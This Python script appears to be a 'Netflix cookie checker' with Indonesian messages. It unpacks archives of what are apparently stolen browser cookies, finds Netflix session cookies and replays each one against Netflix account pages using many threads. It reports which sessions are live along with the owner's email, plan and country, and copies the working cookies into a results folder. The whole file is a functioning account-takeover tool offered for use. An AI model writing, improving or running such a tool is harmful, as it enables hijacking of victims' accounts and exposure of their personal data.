#!/usr/bin/env python3
import requests
import sys
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

BANNER = """
╔══════════════════════════════════════╗
║     NETFLIX COOKIE CHECKER           ║
║     Extract RAR + Check Cookies      ║
║     by: dukunline-cyber              ║
╚══════════════════════════════════════╝
"""


def extract_archive(file_path):
    output_dir = os.path.splitext(file_path)[0] + '_extracted'
    os.makedirs(output_dir, exist_ok=True)

    ext = file_path.lower()
    if ext.endswith('.rar'):
        if subprocess.run(['which', 'unrar'], capture_output=True).returncode == 0:
            cmd = ['unrar', 'x', '-o+', '-p-', file_path, output_dir + '/']
        elif subprocess.run(['which', '7z'], capture_output=True).returncode == 0:
            cmd = ['7z', 'x', file_path, f'-o{output_dir}', '-y']
        else:
            print('[!] ERROR: Install unrar dulu -> sudo apt install unrar')
            sys.exit(1)
    elif ext.endswith('.zip'):
        cmd = ['unzip', '-o', file_path, '-d', output_dir]
    elif ext.endswith('.7z'):
        cmd = ['7z', 'x', file_path, f'-o{output_dir}', '-y']
    else:
        print('[!] Format tidak didukung. Gunakan .rar / .zip / .7z')
        sys.exit(1)

    print(f'[*] Extracting: {file_path}')
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f'[!] Extract gagal: {result.stderr.strip()}')
        sys.exit(1)

    print(f'[*] Extracted ke: {output_dir}')
    return output_dir


def find_cookie_files(directory):
    found = []
    for root, dirs, files in os.walk(directory):
        for fname in files:
            filepath = os.path.join(root, fname)
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    head = f.read(3000)
                if '.netflix.com' in head and ('NetflixId' in head or 'SecureNetflixId' in head):
                    found.append(filepath)
            except:
                continue
    return found


def parse_cookies(text):
    cookies = {}
    for line in text.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies


def extract_json_value(text, key):
    token = f'"{key}":"'
    if token in text:
        return text.split(token, 1)[1].split('"', 1)[0]
    return None


def check_cookie(filepath):
    with open(filepath, 'r', errors='ignore') as f:
        content = f.read()

    cookies = parse_cookies(content)

    if not cookies.get('NetflixId') and not cookies.get('SecureNetflixId'):
        return filepath, 'INVALID', 'Missing NetflixId', {}

    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    for name, value in cookies.items():
        session.cookies.set(name, value, domain='.netflix.com')

    try:
        # Check 1: Account page
        r = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=False)

        if r.status_code == 200:
            info = {}
            text = r.text
            try:
                info['email'] = extract_json_value(text, 'userEmail')
                info['plan'] = extract_json_value(text, 'planName') or extract_json_value(text, 'planDescription') or extract_json_value(text, 'planNickname')
                info['country'] = extract_json_value(text, 'countryOfSignup')
            except:
                pass
            if info or 'profileName' in text or 'memberSince' in text:
                return filepath, 'LIVE', 'Active account', info

        if r.status_code == 302:
            loc = r.headers.get('Location', '')
            if '/login' in loc or 'login' in loc:
                return filepath, 'DEAD', 'Expired - redirect to login', {}
            if '/browse' in loc:
                return filepath, 'LIVE', 'Active (redirect to browse)', {}

        # Check 2: Browse page fallback
        r2 = session.get('https://www.netflix.com/browse', headers=headers, timeout=20, allow_redirects=False)
        if r2.status_code == 200 and 'profiles' in r2.text.lower():
            return filepath, 'LIVE', 'Active', {}
        if r2.status_code == 302 and '/login' in r2.headers.get('Location', ''):
            return filepath, 'DEAD', 'Expired', {}

        return filepath, 'UNKNOWN', f'HTTP {r.status_code}', {}

    except requests.exceptions.Timeout:
        return filepath, 'ERROR', 'Timeout', {}
    except Exception as e:
        return filepath, 'ERROR', str(e)[:60], {}


def main():
    print(BANNER)

    # Input
    if len(sys.argv) >= 2:
        target = sys.argv[1]
    else:
        target = input('[?] Path ke file RAR/ZIP/7z atau folder: ').strip()

    if not os.path.exists(target):
        print(f'[!] Tidak ditemukan: {target}')
        sys.exit(1)

    # Extract jika archive
    if os.path.isfile(target) and target.lower().endswith(('.rar', '.zip', '.7z')):
        scan_dir = extract_archive(target)
    elif os.path.isdir(target):
        scan_dir = target
    else:
        scan_dir = None
        cookie_files = [target]

    # Scan cookie files
    if scan_dir:
        print(f'[*] Scanning cookie files...')
        cookie_files = find_cookie_files(scan_dir)

    if not cookie_files:
        print('[!] Tidak ada cookie Netflix ditemukan!')
        sys.exit(1)

    print(f'[*] Ditemukan: {len(cookie_files)} cookie file(s)')

    # Threads
    try:
        threads = int(input('[?] Threads (default 5): ').strip() or '5')
    except:
        threads = 5

    print(f'[*] Checking dengan {threads} threads...\n')

    # Check all
    live = []
    dead = []
    errors = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_cookie, fp): fp for fp in cookie_files}

        for future in as_completed(futures):
            filepath, status, msg, info = future.result()
            fname = os.path.basename(filepath)

            if status == 'LIVE':
                extras = ''
                if info:
                    parts = []
                    if info.get('email'):
                        parts.append(info['email'])
                    if info.get('plan'):
                        parts.append(info['plan'])
                    if info.get('country'):
                        parts.append(info['country'])
                    extras = ' | ' + ' | '.join(parts)
                print(f'  [\033[92mLIVE\033[0m] {fname} - {msg}{extras}')
                live.append(filepath)

            elif status == 'DEAD':
                print(f'  [\033[91mDEAD\033[0m] {fname} - {msg}')
                dead.append(filepath)

            else:
                print(f'  [\033[93m{status}\033[0m] {fname} - {msg}')
                errors.append(filepath)

    # Summary
    print(f'\n{"="*40}')
    print(f'  LIVE  : {len(live)}')
    print(f'  DEAD  : {len(dead)}')
    print(f'  ERROR : {len(errors)}')
    print(f'  TOTAL : {len(cookie_files)}')
    print(f'{"="*40}')

    # Save results
    if live:
        os.makedirs('results/live', exist_ok=True)
        for fp in live:
            fname = os.path.basename(fp)
            with open(fp, 'r', errors='ignore') as src:
                with open(f'results/live/{fname}', 'w') as dst:
                    dst.write(src.read())
        print(f'\n[*] Cookie LIVE disimpan di: results/live/')

    if dead:
        os.makedirs('results/dead', exist_ok=True)
        for fp in dead:
            fname = os.path.basename(fp)
            with open(fp, 'r', errors='ignore') as src:
                with open(f'results/dead/{fname}', 'w') as dst:
                    dst.write(src.read())
        print(f'[*] Cookie DEAD disimpan di: results/dead/')

    print(f'\n[*] Selesai!')


if __name__ == '__main__':
    main()
